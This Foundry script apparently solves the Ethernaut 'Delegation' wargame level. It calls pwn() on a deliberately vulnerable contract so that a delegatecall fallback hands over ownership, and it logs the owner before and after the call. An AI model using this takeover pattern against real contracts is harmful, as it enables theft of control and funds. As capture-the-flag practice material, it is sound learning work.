// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Ethernaut/Delegation/Delegation.sol";
import "forge-std/console.sol";

//Execute
//forge script script/Delegation.s.sol:DelegationScript --rpc-url $RINKEBY_RPC_URL --broadcast --private-key $PRIVATE_KEY --verify --etherscan-api-key $ETHERSCAN_KEY
   
contract DelegationScript is Script {
    function setUp() public {}

    function run() public {

        console.log(msg.sender);
        console.log("####1");
        vm.startBroadcast();

        console.log("####2");
        Delegation delegation = Delegation(0x0443A0b1882F2F8b58DB2329Dc43Ef559d19D7E1);
        console.log(address(this));
        console.log(delegation.owner());

        console.log("####3");
        address(delegation).call(abi.encodeWithSignature("pwn()"));
        console.log(address(delegation));
        console.log(delegation.owner());

        
        console.log("####4");
        vm.stopBroadcast();
        
        console.log("####5");

    }
}
